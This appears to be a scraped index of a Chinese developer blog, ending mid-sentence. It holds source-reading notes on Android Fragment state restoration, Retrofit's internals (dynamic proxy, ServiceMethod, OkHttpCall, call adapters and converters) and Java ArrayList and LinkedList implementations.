这种在Activity中持有mFragment,或者在Adapter中持有mFragments的做法是有可能出错的亲身遇到过这种事，在Activity中持有了mFragments[]，在特定的时段（可能stateSave已经调用过了），再去debug查看，发现mFragments中的所有fragment都处于一种被detach的状态(所有的boolean被设置为false，所有的field被设置为null)。这件事的原因是在onSaveInstance和onRestoreInstance之间发生的。复现前提条件是viewPager.setOffScreenLimit设置的比较大,比如mDatas.size()-1具体来说就是：Fragment在onRestoreInstance之后都是通过反射重新恢复的，而在FragmentStatePagerAdapter中有这么一段， @Override public void restoreState(Parcelable state, ClassLoader loader) { if (state != null) { Iterable&lt;String&gt; keys = bundle.keySet(); for (String key: keys) { if (key.startsWith(&quot;f&quot;)) { int index = Integer.parseInt(key.substring(1)); Fragment f = mFragmentManager.getFragment(bundle, key); if (f != null) { while (mFragments.size() &lt;= index) { mFragments.add(null); } f.setMenuVisibility(false); mFragments.set(index, f); } else { Log.w(TAG, &quot;Bad fragment at key &quot; + key); } } } } } 这个mFragments是FragmentStatePagerAdapter的私有成员变量，在恢复状态之后，将不再使用开发者的mAdapter中持有的fragments，直接使用恢复状态过来的fragments（这个要看ViewPager的populate方法了，offscreenLimit比较大的时候就不会调用adapter的instantiateItem）。此时，UI上显示的将不再是mAdapter中的东西。这件事本质上还是开发者自己没处理好saveState这件事。 正确的做法是在此时通过getSupportFragmentManager去getFragments(不知道这个是不是open api)。得到一个list，这里面存着被重新创建的fragment的实例。因故此时外部持有的fragment实例已经是无效的实例了。解决方式：看见FragmentStatePagerAdapter的restoreState是怎么找到当前UI中显示的Fragment的了吧，直接复制粘贴，mAdapter复写restoreState方法，在这里面照着Fragment f = mFragmentManager.getFragment(bundle, key)一个个找到当前UI上显示的Fragment，一个个填充到mAdapter中的list里面。（或许有更优雅的实现，这里只是一种亲测可行的方式） Reference Fragment的onAttach和onDetach什么时候会调用 Glide是怎么跟生命周期挂钩的 Activity的onSaveInstanceState什么时候会调用 Activity-LifeCycle Fragments文档不要依赖Implementation Detail,源码随时会变，官方的文档才是值得依赖的。","tags":[{"name":"android","slug":"android","permalink":"https://haldir65.github.io/tags/android/"}]},{"title":"Retrofit源码阅读笔记","date":"2017-07-01T23:03:00.000Z","path":"2017/07/01/2017-07-01-it-began-with-a-few-bits/","text":"This is gonna be nasty…… TL;DR 1. Retrofit1.1 使用方法Retrofit本身并不局限于Android平台，java应用也可以用来和服务器沟通。Retrofit一般的用法看上去很简单 public interface GitHub { @GET(&quot;/repos/{owner}/{repo}/contributors&quot;) Call&lt;List&lt;Contributor&gt;&gt; contributors( @Path(&quot;owner&quot;) String owner, @Path(&quot;repo&quot;) String repo); } Retrofit retrofit = new Retrofit.Builder() .baseUrl(API_URL) // end_point .addConverterFactory(GsonConverterFactory.create()) .build(); // Create an instance of our GitHub API interface. GitHub github = retrofit.create(GitHub.class); // Create a call instance for looking up Retrofit contributors. Call&lt;List&lt;Contributor&gt;&gt; call = github.contributors(&quot;square&quot;, &quot;retrofit&quot;); // Fetch and print a list of the contributors to the library. List&lt;Contributor&gt; contributors = call.execute().body(); for (Contributor contributor : contributors) { System.out.println(contributor.login + &quot; (&quot; + contributor.contributions + &quot;)&quot;); } 关键来看这段 retroft.create ,重点都在这里面。关键的代码就在这三行里面了 大名鼎鼎的动态代理 @SuppressWarnings(&quot;unchecked&quot;) // Single-interface proxy creation guarded by parameter safety. public &lt;T&gt; T create(final Class&lt;T&gt; service) { Utils.validateServiceInterface(service); if (validateEagerly) { eagerlyValidateMethods(service); } return (T) Proxy.newProxyInstance(service.getClassLoader(), new Class&lt;?&gt;[] { service }, new InvocationHandler() { private final Platform platform = Platform.get(); @Override public Object invoke(Object proxy, Method method, @Nullable Object[] args) throws Throwable { // If the method is a method from Object then defer to normal invocation. if (method.getDeclaringClass() == Object.class) { return method.invoke(this, args); } if (platform.isDefaultMethod(method)) { return platform.invokeDefaultMethod(method, service, proxy, args); } ServiceMethod&lt;Object, Object&gt; serviceMethod = (ServiceMethod&lt;Object, Object&gt;) loadServiceMethod(method); OkHttpCall&lt;Object&gt; okHttpCall = new OkHttpCall&lt;&gt;(serviceMethod, args); return serviceMethod.adapt(okHttpCall); } }); } 主要就这三个方法 ServiceMethod serviceMethod = loadServiceMethod(method);OkHttpCall okHttpCall = new OkHttpCall&lt;&gt;(serviceMethod, args);return serviceMethod.callAdapter.adapt(okHttpCall); 1.2 第一个方法以及ServiceMethod的创建loadServiceMethod(Method)会查找invoke的时候会查找methodCache中有没有这个方法，没有的话调用Builder方法创建一个ServiceMethod实例并放入cahce。看一看这个Builder的构造函数 ，基本上就是把Builder中的参数引用赋值给ServiceMethod实例。 result = new ServiceMethod.Builder(this, method).build(); public Builder(Retrofit retrofit, Method method) { this.retrofit = retrofit; //client创建retrofit时可以设定一些属性 this.method = method; this.methodAnnotations = method.getAnnotations(); this.parameterTypes = method.getGenericParameterTypes(); this.parameterAnnotationsArray = method.getParameterAnnotations(); } 根据ServiceMethod的变量名基本上能够猜到各自的用处，比如httpMethod（GET、POST）, contentType（MimeType） public ServiceMethod build() { // 1.创建callAdapter,调用retrofit对象设定的callAdapter,例如RxjavAdapter,注意这里面的实现是便利retrofit对象的adapterFactories，找到一个就返回。找不到的话会丢出来一个IllegalArgumentException callAdapter = createCallAdapter(); //callAdapter的作用 就是将retrofit.Call的Call转成一个T。例如上面就是把Call&lt;List&lt;Contributor&gt;&gt;转成一个List&lt;Contributor&gt;，这个过程是上面提到的最重要的三个方法中的第三部 adapt（okHttpCall）。可以认为是拿着一个已经创建好的okHttp的Call去做事情，在适当的时候将网络返回结果转成用户事先定义好的respose类型。 //这一步返回一个java.lang.reflect.Type ，就个class的基本作用家就是根据泛型来确定response的class。 responseType = callAdapter.responseType(); //2.创建用于response和Request的converter。 responseConverter = createResponseConverter(); for (Annotation annotation : methodAnnotations) { parseMethodAnnotation(annotation); //这里面就是把@GET变成&quot;GET&quot;这个String，表示当前方法是一个GET请求 } int parameterCount = parameterAnnotationsArray.length; //3.创建ParameterHandler parameterHandlers = new ParameterHandler&lt;?&gt;[parameterCount]; for (int p = 0; p &lt; parameterCount; p++) { Type parameterType = parameterTypes[p]; Annotation[] parameterAnnotations = parameterAnnotationsArray[p]; if (parameterAnnotations == null) { throw parameterError(p, &quot;No Retrofit annotation found.&quot;); } parameterHandlers[p] = parseParameter(p, parameterType, parameterAnnotations); //关键看这个方法 private ParameterHandler&lt;?&gt; parseParameter(int p, Type parameterType, Annotation[] annotations) 第一个参数表示当前的数组index 第二个参数表示想要的Response类型 第三个参数表示该方法上的注解，就是@那些东西 接下来就是调用 private ParameterHandler&lt;?&gt; parseParameterAnnotation( int p, Type type, Annotation[] annotations, Annotation annotation)方法来判断各种Http方法，这一段代码有300多行。。。。看完有助于掌握Http协议。 } return new ServiceMethod&lt;&gt;(this); } } 关键是这三个方法，Builder在这个过程中完成了一些变量的赋值 createCallAdapter —&gt; retrofit.callAdapter(returnType, annotations); 从adapterFactories(显然可以有多个)中遍历，找到了一个就返回。已经实现的的有三种策略，DefaultCallAdapterFactory、ExecutorCallAdapterFactory和RxjavaCallAdapterFactory。显然用户可以在创建retrofit实例的过程中install自己的callAdapter实现。再次强调这个CallAdapter的作用，就是将Retrofit的Call adapt成对应的Response class的实例。 createResponseConverter —&gt; retrofit.responseBodyConverter(responseType, annotations);Retrofit2.Converter (from和To，我猜的) Convert objects to and from their representation in HTTP. Instances are created by {@linkplain Factory a factory} which is {@linkplain Retrofit.Builder#addConverterFactory(Factory) installed} into the {@link Retrofit} instance. 从retrofit对象的converterFactories（可以有多个，原因在于server有时候会返回json，有时候会返回protocolBuffer，有时候返回xml，response回来的时候会一个个问，这一点jake Wharton多次提到过）中遍历，找到一个就返回。确切的说，是找到一个能够处理的。 创建parameterHandlers应该可以猜到，这一步就是把用户定义的注解转换成发起网络请求时需要带上的参数 private ParameterHandler&lt;?&gt; parseParameterAnnotation(int p, Type type, Annotation[] annotations, Annotation annotation) 这个方法随便展开一点，关注第三个参数和第四个参数 例如 public interface GitHub { @GET(&quot;/repos/{owner}/{repo}/contributors&quot;) Call&lt;List&lt;Contributor&gt;&gt; contributors( @Path(&quot;owner&quot;) String owner, @Path(&quot;repo&quot;) String repo); } ServiceMethod走到这一步，annotations就表示 @Path(“owner”) String owner。注意这里的@PATH是注解类，可以把它当成一个wrapper，这里面就调用了path.value()。 else if (annotation instanceof Path) { Path path = (Path) annotation; String name = path.value(); // 调用该方法时传入的String validatePathName(p, name); Converter&lt;?, String&gt; converter = retrofit.stringConverter(type, annotations); return new ParameterHandler.Path&lt;&gt;(name, converter, path.encoded()); } ParameterHandler.Path&lt;&gt;在ParameterHandler这个类里面，看一下结构Path这个class中关键的方法apply: @Override void apply(RequestBuilder builder, @Nullable T value) throws IOException { builder.addPathParam(name, valueConverter.convert(value), encoded); } 再往下走： relativeUrl = relativeUrl.replace(&quot;{&quot; + name + &quot;}&quot;, canonicalizeForPath(value, encoded)); apply这个方法会在构建Request时由RequestBilder调用，以上面的实例为例子，name就是”owner” ,value就是调用该方法时传进来的值，其实就只是Stirng.replace()方法。到这里，Buidler已经完成了 准备callAdapter， createResponseConverter 和填充parameterHandlers数组的任务直接new一个ServiceMethod出来就好了 ServiceMethod(Builder&lt;T&gt; builder) { this.callFactory = builder.retrofit.callFactory(); // okhttp3.Call.Factory this.callAdapter = builder.callAdapter; // this.baseUrl = builder.retrofit.baseUrl(); //这个就是 this.responseConverter = builder.responseConverter; // GsonConverter this.httpMethod = builder.httpMethod; //@GET this.relativeUrl = builder.relativeUrl; //@Path this.headers = builder.headers; //@Header this.contentType = builder.contentType; //application/json这种 this.hasBody = builder.hasBody; this.isFormEncoded = builder.isFormEncoded; this.isMultipart = builder.isMultipart; this.parameterHandlers = builder.parameterHandlers; } 上面最重要的三个方法讲完了第一个。 1.3 第二个方法和OkHttpCall第二个方法:OkHttpCall okHttpCall = new OkHttpCall&lt;&gt;(serviceMethod, args); OkHttpCall的成员变量：okhttp3.Call rawCall //用于发起请求ServiceMethod serviceMethod; //这就是刚才实例化的serviceMethod对象这个类相对简单，主要看execute方法 @Override public Response&lt;T&gt; execute() throws IOException { okhttp3.Call call; synchronized (this) { if (executed) throw new IllegalStateException(&quot;Already executed.&quot;); executed = true; // ... call = rawCall; if (call == null) { try { call = rawCall = createRawCall(); } catch (IOException | RuntimeException | Error e) { //... throw e; } } } return parseResponse(call.execute()); //建立连接，发起请求，解析response都在这里了（都在一条线程上）。execute是okHttp的方法。 } 还记得最简单的Demo吗，同步执行网络请求Call&lt;List&gt; call = github.contributors(“square”, “retrofit”);List contributors = call.execute().body();这也是Retrofit2.Call.execute方法最终就是走到了这里 createRawCall方法 okhttp3.Request request = serviceMethod.toRequest(args); okhttp3.Call call = serviceMethod.callFactory.newCall(request); if (call == null) { throw new NullPointerException(&quot;Call.Factory returned null.&quot;); } return call; parseRespnse的实现 Response&lt;T&gt; parseResponse(okhttp3.Response rawResponse) throws IOException { ResponseBody rawBody = rawResponse.body(); //有用的信息在这里 // Remove the body&#39;s source (the only stateful object) so we can pass the response along. rawResponse = rawResponse.newBuilder() .body(new NoContentResponseBody(rawBody.contentType(), rawBody.contentLength())) .build(); //根据服务器返回的contentType和contentLength创建一个新的response用于检测200 int code = rawResponse.code(); if (code &lt; 200 || code &gt;= 300) { try { // Buffer the entire body to avoid future I/O. ResponseBody bufferedBody = Utils.buffer(rawBody); return Response.error(bufferedBody, rawResponse); //创建一个body为null的Retrofit2.Response } finally { rawBody.close(); } } if (code == 204 || code == 205) { rawBody.close(); return Response.success(null, rawResponse); } ExceptionCatchingRequestBody catchingBody = new ExceptionCatchingRequestBody(rawBody); try { T body = serviceMethod.toResponse(catchingBody); //调用ServiceMethod的responseConverter去转换，前面说过，responseConverter是在builder初始化的时候根据策略，从Retrofit的converterFactories中遍历，找到了就返回。 就是在这里把byte转成Object的 return Response.success(body, rawResponse); //返回创建一个body为定义好的数据类型的Retrofit2.Response，一般情况下，调用Response.body()就能得到所要的实体数据。 } catch (RuntimeException e) { // If the underlying source threw an exception, propagate that rather than indicating it was // a runtime exception. catchingBody.throwIfCaught(); throw e; } } 这里可以得知，Retrofit对于状态码的处理，1XX和3XX以上全部走到error中 execute是同步方法，enqueue是异步请求的方法，底层其实就调用了OkHttp.Call.enqueue()，所以说Retrofit本身并不负责创建网络请求，线程调度。只做了parseRespnse的方法，另外，OkHttp本身并不负责把Response推到主线程上，不过Retrofit判断了Paltform，是Android的话就设置了默认的回调线程为主线程。 public Retrofit build() { //.... Executor callbackExecutor = this.callbackExecutor; if (callbackExecutor == null) { callbackExecutor = platform.defaultCallbackExecutor(); //这里面有一个MainThreadExecutor } //.... } 1.4 第三个方法和AdapterFactoryreturn serviceMethod.callAdapter.adapt(okHttpCall); //这个return需要的是Object,涉及到动态代理，可以无视。 回头看一下serviceMethod的createCallAdapter方法，就是从retrofit对象的adapterFactories中一个个遍历： CallAdapter&lt;?, ?&gt; adapter = adapterFactories.get(i).get(returnType, annotations, this)； 找到之后就返回，默认的实现有DefaultCallAdapterFactory和ExecutorCallAdapterFactory以及RxjavaCallAdapterFactory。 // 在DefaultCallAdapterFactory中的处理方式是 return new CallAdapter&lt;Call&lt;?&gt;&gt;() { @Override public Type responseType() { return responseType; } @Override public &lt;R&gt; Call&lt;R&gt; adapt(Call&lt;R&gt; call) { return call; } }; // ExecutorCallAdapterFactory的处理方式是 return new CallAdapter&lt;Object, Call&lt;?&gt;&gt;() { @Override public Type responseType() { return responseType; } @Override public Call&lt;Object&gt; adapt(Call&lt;Object&gt; call) { return new ExecutorCallbackCall&lt;&gt;(callbackExecutor, call); } }; 其实就是将callback丢到一个线程池callbackExecutor中，这个线程池可以通过Retrofit创建的时候配置，简单来说就是response会在这个线程池中回调。 RxjavaCallAdapterFactory的做法是 @Override public CallAdapter&lt;?&gt; get(Type returnType, Annotation[] annotations, Retrofit retrofit) { Class&lt;?&gt; rawType = getRawType(returnType); String canonicalName = rawType.getCanonicalName(); boolean isSingle = &quot;rx.Single&quot;.equals(canonicalName); //直接看包名。。。。。 boolean isCompletable = &quot;rx.Completable&quot;.equals(canonicalName); if (rawType != Observable.class &amp;&amp; !isSingle &amp;&amp; !isCompletable) { return null; } if (!isCompletable &amp;&amp; !(returnType instanceof ParameterizedType)) { String name = isSingle ? &quot;Single&quot; : &quot;Observable&quot;; throw new IllegalStateException(name + &quot; return type must be parameterized&quot; + &quot; as &quot; + name + &quot;&lt;Foo&gt; or &quot; + name + &quot;&lt;? extends Foo&gt;&quot;); } if (isCompletable) { // Add Completable-converter wrapper from a separate class. This defers classloading such that // regular Observable operation can be leveraged without relying on this unstable RxJava API. // Note that this has to be done separately since Completable doesn&#39;t have a parametrized // type. return CompletableHelper.createCallAdapter(scheduler); } CallAdapter&lt;Observable&lt;?&gt;&gt; callAdapter = getCallAdapter(returnType, scheduler); if (isSingle) { // Add Single-converter wrapper from a separate class. This defers classloading such that // regular Observable operation can be leveraged without relying on this unstable RxJava API. return SingleHelper.makeSingle(callAdapter); } return callAdapter; } 1.5 使用Retrofit的best practices到这里，retrofit的工作流程就通过三个方法讲完了，接下来根据jake wharton的talk making retrofit work for you来讲几个best practice。 1.5.1 end point 不一样怎么办默认情况下，如果不指定client,每一次都会创建一个新的OkHttpClient，这样做就丧失了disk caching,connection pooling等优势。 所以需要提取出一个OkHttpClient,解决方式很简单 1.5.2 不要创建多个HttpClientshallow copy OkHttpClient client = new OkHttpClient(); OkHttpClient clientFoo = client.newBuilder().addInterceptor(new FooInterceptor()).build(); OkHttpClient clientBar = client.newBuilder().readTimeOut(20,SECONDS).writeTimeOut(20,SECONDS).build(); 1.5.3 有的接口需要认证（加Header），有的不需要（比如登录，忘记密码）一般可能会想到在OkHttp的Interceptor中去判断url然后手动加上header，一种更好的解决方式是，假定所有的API都需要加Header，对于登录和忘记密码的Api,这样写 @POST(&quot;/login&quot;) @Headers(&quot;No-Authentication: true&quot;) Call&lt;User&gt; login(@Body LoginRequest request) //这个header对于server是不可见的，现在在Interceptor中，只要判断request.header(“No-Authentication”)==null 即表示该接口需要加上header。所以，对于特定接口的筛选可以，采用这种方式。 1.5.4 Converters将byte变成java对象，底层的解析器不要创建多个addConverterFactory，和之前的创建两个httpclient一样，人们也很容易创建两个解析器。解决方法也很实在，提取出来公用即可。 1.5.5 addConverterFactory可以调用多次假如一个接口返回json，一个接口返回proto。不要试图创建多个retrofit实例。这样就可以了 底层的原理是这样的。User是Proto,Friend是Json。 Proto都extends一个protoType class，所以只要看下是否 instanceof proto就可以了。这一切都是在serviceMethod创建过程中判断的。这里顺序很重要。由于gson基本能够序列化一切，所以gson总是会认为自己可以成功。所以要把protoConverter放在前面。 GsonConverterFactory, SimpleXmlConverterFactory converters , they say yes to everyThing. 所以如果出现这种情况怎么办？ 首先定义自己的注解 @interface Xml {} @interface Json {} interface Service{ @GET(&quot;/User&quot;) @Xml Call&lt;User&gt; user(); // User是XML @GET(&quot;/Friends&quot;) @Json Call&lt;Friends&gt; friends(); //Friends是Json } class XmlOrJsonConverterFactroy extend Converter.Factory{ final Converter.Factory xml = ///; final Converter.Factory json = //....; @override public Converter&lt;ResponseBody,?&gt; responseBodyConverter(Type type, Annotation[] annotations, Retrofit retrofit){ // annotations就包含了刚才我们添加的注解 for (Annotation annotation : annotations){ if(annotation.getClass == Xml.class){ return xml.reponseBodyConverter(type,annotations,retrofit); }else if(annotation.getClass == Json.class){ // json } return null; 都不是。 会去找下一个Converter.. } } } [AnnotatedConverterFactory用于自定义类型](https://github.com/square/retrofit/blob/master/samples/src/main/java/com/example/retrofit/AnnotatedConverters.java) 1.5.6 服务器返回的数据中包括一些metaData使用delegate的方式去除这些metadata，只获取想要的response实体对象但这些metaData是有用的。。怎么处理可以在convert中集中处理自定义错误码。 1.5.7 和Rxjava配合使用CallAdapterFactory和ConverterFactory类似，也可以自定义，所以这样可以直接将所有的Observable返回到主线程 所以，Retrofit就是将HttpClient、Converter和CallAdapter这三样职能结合起来，又提供了足够的定制化。 1.6 补充OkHttp本身没有将response挪到主线程，OkHttp的execute方法在当前线程回调，OkHttp的enqueue方法在OkHttpDispatcher线程回调onResponse。都没有推到主线程。 Retrofit这么干了，具体在Retrofit.Builder.build方法里面 public Retrofit build() { Executor callbackExecutor = this.callbackExecutor; if (callbackExecutor == null) { callbackExecutor = platform.defaultCallbackExecutor(); //Andriod平台默认挪到主线程，就是一个持有主线程的线程池 //这个线程池的excute方法就是用一个handler推到主线程了。 } //把这个defaultCallAdapterFactory默认添加到列表中第一个的位置 List&lt;CallAdapter.Factory&gt; callAdapterFactories = new ArrayList&lt;&gt;(this.callAdapterFactories); callAdapterFactories.add(platform.defaultCallAdapterFactory(callbackExecutor)); //这里传进去callAdapterFactories是一个list，头一个factory是defaultCallAdapterFactory return new Retrofit(callFactory, baseUrl, unmodifiableList(converterFactories), unmodifiableList(callAdapterFactories), callbackExecutor, validateEagerly); } 这个callbackExecutor什么时候用的呢，还记得三个方法中最后一个serviceMethod.adapt吗，调用顺序如下：serviceMethod.adapt -&gt; ServiceMethod的成员变量callAdapter.adapt(call) (这个时候还没发起请求哈) -&gt;这个callAdapter是在ServiceMethod.Builder.build中调用了retrofit.callAdapter(returnType, annotations);-&gt; 继而调用到nextCallAdapter-&gt; callAdapterFactories.get(i).get(returnType, annotations, this);就是在Retrofit对象的callAdapterFactories这个列表里找，上面不是说默认添加了第一个吗，所以这个get方法会跑到ExecutorCallAdapterFactory.get方法中。而对应的实现返回了new ExecutorCallbackCall&lt;&gt;(callbackExecutor, call);//callbackExecutor是那个主线程的executor外部执行Retrofit.call.enqueue -&gt; serviceMethod.adapt -&gt; ExecutorCallbackCall.enqueue -&gt; (调用oKhttp的qnqueue，在onResponse中callbackExecutor.execute -&gt; { callback.onResponse() }) 外部调用经历流程 public interface GitHubService { @GET(&quot;users/{user}/repos&quot;) Call&lt;List&lt;Repo&gt;&gt; listRepos(@Path(&quot;user&quot;) String user); //可以认为这底下就是藏着一个ServiceMethod的实例 } Retrofit retrofit = new Retrofit.Builder() .baseUrl(&quot;https://api.github.com/&quot;) .build(); GitHubService service = retrofit.create(GitHubService.class);//在这里以动态代理的方式生产ServiceMethod Call&lt;List&lt;Contributor&gt;&gt; call = github.contributors(&quot;square&quot;, &quot;retrofit&quot;);//在这里调用了serviceMethod.adapt方法 List&lt;Contributor&gt; contributors = call.execute().body();//这里是Call类型，说明上面serviceMethod.adapt返回了一个 也就是说这个adapt方法会返回Call ，或者Observable类型的数据怎么做到的呢？ 它会拿着期待的返回类型(Call,Observable)去询问Retrofit的callAdapterFactories里面的每一个callAdapterFactory的get(returntype)方法，上面github这种，returnType就是Call.class DefaultCallAdapterFactory.java final class DefaultCallAdapterFactory extends CallAdapter.Factory { static final CallAdapter.Factory INSTANCE = new DefaultCallAdapterFactory(); @Override public CallAdapter&lt;?, ?&gt; get(Type returnType, Annotation[] annotations, Retrofit retrofit) { if (getRawType(returnType) != Call.class) { //如果是call，那么能够handle的来，否则nextCallAdapter return null; } final Type responseType = Utils.getCallResponseType(returnType); return new CallAdapter&lt;Object, Call&lt;?&gt;&gt;() { @Override public Type responseType() { return responseType; } @Override public Call&lt;Object&gt; adapt(Call&lt;Object&gt; call) { return call; } }; } } RxJava2CallAdapterFactory 是这样回应的。其实就是看一个listRepos这个方法的返回类型 boolean isFlowable = rawType == Flowable.class; boolean isSingle = rawType == Single.class; boolean isMaybe = rawType == Maybe.class; if (rawType != Observable.class &amp;&amp; !isFlowable &amp;&amp; !isSingle &amp;&amp; !isMaybe) { return null; } ExecutorCallAdapterFactory @Override public CallAdapter&lt;?, ?&gt; get(Type returnType, Annotation[] annotations, Retrofit retrofit) { if (getRawType(returnType) != Call.class) { return null; } final Type responseType = Utils.getCallResponseType(returnType); return new CallAdapter&lt;Object, Call&lt;?&gt;&gt;() { @Override public Type responseType() { return responseType; } @Override public Call&lt;Object&gt; adapt(Call&lt;Object&gt; call) { return new ExecutorCallbackCall&lt;&gt;(callbackExecutor, call);//这个在Android平台上默认会把onResponse搞到主线程上 } }; } //DefaultCallAdapterFactory里面 @Override public Call&lt;Object&gt; adapt(Call&lt;Object&gt; call) { return call; } // ExecutorCallAdapterFactory @Override public Call&lt;Object&gt; adapt(Call&lt;Object&gt; call) { return new ExecutorCallbackCall&lt;&gt;(callbackExecutor, call); } //RxJava2CallAdapter @Override public Object adapt(Call&lt;R&gt; call) { Observable&lt;Response&lt;R&gt;&gt; responseObservable = isAsync //这个isAsync默认是false ? new CallEnqueueObservable&lt;&gt;(call) : new CallExecuteObservable&lt;&gt;(call); ///.... return observable; } 所以Retrofit的service里面可以返回各种类型。 call.enqueue(new okhttp3.Callback() { @Override public void onResponse(okhttp3.Call call, okhttp3.Response rawResponse) { //..这里还是oKHttp的Dispatcher线程，所以解析数据是在子线程上的 response = parseResponse(rawResponse); // 这然后才是callback，在ExecutorCallAdapterFactory中callbackExecutor.execute(），就是在这里推向主线程的 callback.onResponse(OkHttpCall.this, response); } } 那么假如是Rxjava2CallAdapterFactory呢,callAdapter返回的是默认CallExecuteObservable， @Override protected void subscribeActual(Observer&lt;? super Response&lt;T&gt;&gt; observer) { Response&lt;T&gt; response = call.execute();//不要被这个call.execute.execute迷惑了 if (!disposable.isDisposed()) { observer.onNext(response); } } //OkHttpCall @Override public Response&lt;T&gt; execute() throws IOException { // ... return parseResponse(call.execute());//所以还是要走ResponseBodyConverter那一套的 } 根据jake Wharton在stackoverFlow上的回答,Retrofit parse byte to Object的过程是发生在子线程的。 update根据stackoverFlow上的解释，对于queryParameters，一些optional的参数直接传null就可以了 这段从源码上还没有来得及看清楚。 2. OkHttp3. A few ‘ok’ librarieswhy moshi ? why Retrofit call can be clone cheap？why SinkedSource?why protolBuffer cost less ? Ref Paisy解析Retrofit open-sourse-projetc解析Retrofit Making Retrofit Work For You by Jake Wharton","tags":[{"name":"Retrofit","slug":"Retrofit","permalink":"https://haldir65.github.io/tags/Retrofit/"},{"name":"OkHttp","slug":"OkHttp","permalink":"https://haldir65.github.io/tags/OkHttp/"},{"name":"Okio","slug":"Okio","permalink":"https://haldir65.github.io/tags/Okio/"}]},{"title":"Java集合类的一些整理","date":"2017-06-25T22:56:33.000Z","path":"2017/06/25/2017-06-12-Collections-Refuled-by-Stuart-Marks/","text":"根据网上的大部分博客的分类，集合框架分为Collections(具有类似数组的功能)和Map(存储键值对)这两大部分。针对jdk1.8的java.util里面的一些常用的或者不常用的集合做一些分析。写这篇文章的过程中，我慢慢发现不同版本jdk的同一个class的实现是有一些差异的(LinkedList)，由于对照的是java1.8的代码，里面会多一些since 1.8的代码，这里不作论述。 java集合的大致框架建议参考网上博客的总结，Java集合干货系列写的比较好，图画的也不错，针对jdk 1.6源码讲的。我这里只是自己学习过程中的一些笔记。 ListArrayList (建议new出来的时候给定一个适当的size，不然每次扩容很慢的，可以放null)LinkedList(not recommended，增删元素的时候快一点)Vector（线程安全,重同步，不推荐） SetHashSet (底层是HashMap)TreeSet(排序存储)LinkedHashSet(底层是LinkedHashMap) QueueStack ArrayDeque(不常用) MapHashMap （键值都可以为null,底层是哈希表）TreeMap(底层二叉树)HashTable(线程安全，键值都不允许为null)SparseArray(Android平台用) 关于集合，不得不提到泛型，Java 1.5引入了泛型，关于泛型，找到一篇很好的文章类型擦除原理。本质上只是提供了编译期类型检查。编译通过后都是Object，所以叫做类型擦除。 1. List的解析1.1 ArrayList源码解析 先上一段崩溃代码```javapublic static void main(String[] args) { String[] array = new String[]{“a”, “b”, “c”, “d”}; List l = Arrays.asList(array); l.add(“d”);} Exception in thread “main” java.lang.UnsupportedOperationException at java.util.AbstractList.add(AbstractList.java:148) at java.util.AbstractList.add(AbstractList.java:108) at com.example.demo.main(ConcurrentModificationListDemo.java:13) 问题出在Arrays.asList返回了一个**java.util.Arrays.ArrayList**，而不是**java.util.ArrayList**。前者只实现了List接口的有限的几个方法，并且是Arrays内部的一个private class。 正确的用法是new 一个ArrayList，把这个有限的list的元素(的指针)copy进去，即addAll()方法 ArrayList.toArray(T[] a)是把所有的elements通过System.arraycopy(elementData, 0, a, 0, size);复制到a数组中。 - System.arraycopy可以从自己的数组复制到自己的数组 ```java public void add(int index, E element) { rangeCheckForAdd(index); ensureCapacityInternal(size + 1); // Increments modCount!! System.arraycopy(elementData, index, elementData, index + 1, size - index); elementData[index] = element; size++; } 添加到指定位置，System.arrayCopy可以从同一个数组复制到同一个数组，几乎就是挪动指针了。 不常见的方法 //下面这两个是因为ArrayList implements java.io.Serializable，是序列化时会调用的 private void writeObject(java.io.ObjectOutputStream s) private void readObject(java.io.ObjectInputStream s) protected void removeRange(int fromIndex, int toIndex) public boolean removeAll(Collection&lt;?&gt; c) //给一个集合，删除list与之的交集 public boolean retainAll(Collection&lt;?&gt; c) // 给定一个集合，从list中删除所有不在这个集合里面的元素 public void trimToSize() // 内存压力大的时候可以释放掉一部分内存，记得那个1.5倍的默认扩容嘛，释放的就是这0.5的内存 多线程场景下要注意的问题 和Vector不同，ArrayList中的操作不是线程安全的！所以，建议在单线程中才使用ArrayList，而在多线程中可以选择Vector或者CopyOnWriteArrayList。 CopyOnWriteArrayList的get操作是通过将elements声明为volatile，而修改(增删改)则是通过修改(copyOf(原来的List)，完事CAS去设置object，所以修改的比较多的话会导致大量的memory copy，性能差一点) 时间复杂度问题：直接看javadoc怎么说的:The size, isEmpty, get, set, iterator, and listIterator operations run in constant time. The add operation runs in amortized constant time, that is, adding n elements requires O(n) time. All of the other operations run in linear time (roughly speaking). The constant factor is low compared to that for the LinkedList implementation. Operation Array ArrayList Singly Linked List Read (any where) O(1) O(1) O(n) Add/Remove at end O(1) O(1) O(n) Add/Remove in the interior O(n) O(n) O(n) Resize O(n) N/A N/A Find By position O(1) O(1) O(n) Find By target (value) O(n) O(n) O(n) 图表参考 HashMapput操作的时间复杂度理论上来说当然是O(1)，但是实际上还有很多时间开销的，比如hash碰撞，另外hash的计算也要耗费CPU时间。所以一般我们认为它的时间复杂度是常数级的。 1.2 LinkedList的一些点LinkedList是双向链表实现的，可以想象成一帮小孩左手拉右手绕成一个圈，只不过这里面的每一个小孩并不是你放进去的 T 类型数据，而是一个Node 。所以LinkedList是可以放进去一个Null的。LinkedList往往被人诟病的就是除了添加和删除快之外，get和set很慢。来看下add的实现（jdk 1.8） public boolean add(E e) { linkLast(e); return true; } /** * Links e as last element. */ void linkLast(E e) { final Node&lt;E&gt; l = last; //先把链表的尾巴找出来 final Node&lt;E&gt; newNode = new Node&lt;&gt;(l, e, null); // 可以想象每次add都有new的操作，并将原来的尾巴作为这个新的Entry的头部 last = newNode; //新的Node将成为新的尾巴 if (l == null) //这种情况是原来没有尾巴，也就是说size = 0 first = newNode; //这时候就只有一个Node，头和尾都是Null else l.next = newNode; //不然的话，旧的尾巴变成了倒数第二个，它的next指向了新的Entry. size++; modCount++; } add的过程看起来很快，new一个entery，确定下前后的指针就可以了。remove也差不多，取消指针引用即可。 来看比较慢的get public E get(int index) { checkElementIndex(index); return node(index).item; } /** * Returns the (non-null) Node at the specified element index. */ Node&lt;E&gt; node(int index) { // assert isElementIndex(index); if (index &lt; (size &gt;&gt; 1)) { Node&lt;E&gt; x = first; for (int i = 0; i &lt; index; i++) x = x.next; //一直遍历到这个index才返回，慢 return x; } else { Node&lt;E&gt; x = last; for (int i = size - 1; i &gt; index; i--) x = x.prev; return x; } } 值得注意的一点小事：ArrayList implement RandomAccess接口，而LinkedList并没有。RandomAccess接口的定义如下 Marker interface used by List implementations to indicate that they support fast (generally constant time) random access. The primary purpose of this interface is to allow generic algorithms to alter their behavior to provide good performance when applied to either random or sequential access lists.* The best algorithms for manipulating random access lists (such as ArrayList) can produce quadratic behavior when applied to sequential access 